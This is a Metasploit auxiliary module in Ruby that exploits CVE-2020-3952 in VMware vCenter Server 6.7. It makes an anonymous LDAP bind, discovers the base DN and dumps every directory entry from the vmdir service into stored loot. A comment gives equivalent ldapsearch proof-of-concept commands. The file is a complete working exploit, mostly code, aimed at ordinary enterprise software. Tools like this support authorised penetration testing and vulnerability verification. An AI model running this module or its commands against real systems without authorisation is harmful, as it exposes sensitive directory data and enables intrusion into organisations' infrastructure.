##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# I'm tired of reinventing the wheel, so use a gem this time
require 'net-ldap'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VMware vCenter Server vmdir Information Disclosure',
      'Description'    => %q{
        This module uses an anonymous-bind LDAP connection to dump data from the
        vmdir service in VMware vCenter Server version 6.7 prior to the 6.7U3f
        update. Only installations upgraded from a previous release line, such
        as 6.0 or 6.5, are affected. Clean installations of 6.7 are unaffected.

        If the BASE_DN option is set, it will be used as the LDAP base DN for
        all requests. Since this option is unset by default, the base DN will be
        discovered by searching the root DSE for the namingContexts attribute,
        from which the base DN will be extracted.

        If the PRINT_DATA option is set, LDAP data will be printed to the screen
        as well as stored in loot. This option is unset by default because it
        results in very noisy output. In either case, LDAP data is converted to
        LDIF for readability before it is stored or printed.
      },
      'Author'         => [
        # Discovered by unknown researcher(s)
        'wvu' # Module
      ],
      'References'     => [
        ['CVE', '2020-3952'],
        ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
      ],
      'DisclosureDate' => '2020-04-09', # Vendor advisory
      'License'        => MSF_LICENSE,
      'Actions'        => [['Dump', 'Description' => 'Dump all LDAP data']],
      'DefaultAction'  => 'Dump',
      'Notes'          => {
        'Stability'    => [CRASH_SAFE],
        'SideEffects'  => [IOC_IN_LOGS]
      }
    ))

    register_options([
      Opt::RHOST,      # XXX: No included mixin provides this
      Opt::RPORT(389), # XXX: No included mixin provides this
      OptString.new('BASE_DN',  [false, 'LDAP base DN (discovered if unset)']),
      OptBool.new('PRINT_DATA', [false, 'Print LDAP data to screen', false])
    ])

    register_advanced_options([
      OptFloat.new('ConnectTimeout', [false, 'Timeout for LDAP connect', 10.0])
    ])
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def peer
    "#{rhost}:#{rport}"
  end

=begin PoC using ldapsearch(1)
  Retrieve root DSE with base DN:
    ldapsearch -xb "" -s base -H ldap://[redacted]

  Dump data using discovered base DN:
    ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted]
=end
  def run
    opts = {
      host:            rhost,
      port:            rport,
      connect_timeout: datastore['ConnectTimeout']
    }

    unless (ldap = Net::LDAP.new(opts))
      print_error('Could not create Net::LDAP object with supplied options')
      return
    end

    if datastore['BASE_DN']
      @base_dn = datastore['BASE_DN']
      print_status("Using base DN from BASE_DN option: #{@base_dn}")
    else
      print_status('Discovering base DN automatically')
      @base_dn = discover_base_dn(ldap)
    end

    unless @base_dn
      print_error('Could not discover base DN; try setting the BASE_DN option?')
      return
    end

    print_status("Dumping LDAP data from vmdir service at #{peer}")
    entries = ldap.search(base: @base_dn)

    if entries.nil? || entries.empty?
      print_error("#{peer} is NOT vulnerable to CVE-2020-3952")
      return
    end

    print_good("#{peer} is vulnerable to CVE-2020-3952")
    pillage(entries)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    return
  end

  def discover_base_dn(ldap)
    print_status('Searching root DSE for namingContexts attribute with base DN')

    unless (root_dse = ldap.search_root_dse)
      print_error('Could not retrieve root DSE')
      return
    end

    vprint_line(root_dse.to_ldif)

    # NOTE: Net::LDAP converts attribute names to lowercase
    if root_dse[:namingcontexts].nil? || root_dse[:namingcontexts].empty?
      print_error('Could not find namingContexts attribute with base DN')
      return
    end

    # NOTE: We assume the first namingContexts value is the base DN
    base_dn = root_dse[:namingcontexts].first

    print_good("Discovered base DN: #{base_dn}")
    base_dn
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    return
  end

  def pillage(entries)
    # TODO: Make this more efficient?
    ldif = entries.map(&:to_ldif).join("\n")

    print_status('Storing LDAP data in loot; use the "loot" command to see it!')

    ldif_filename = store_loot(
      self.name,             # ltype
      'text/plain' ,         # ctype
      rhost,                 # host
      ldif,                  # data
      nil,                   # filename
      "Base DN: #{@base_dn}" # info
    )

    if ldif_filename
      print_good("Saved LDAP data (#{ldif.length} bytes) to #{ldif_filename}")
    end

    if datastore['PRINT_DATA']
      print_warning('Printing LDAP data to screen!')
      print_line(ldif)
    end
  end

end
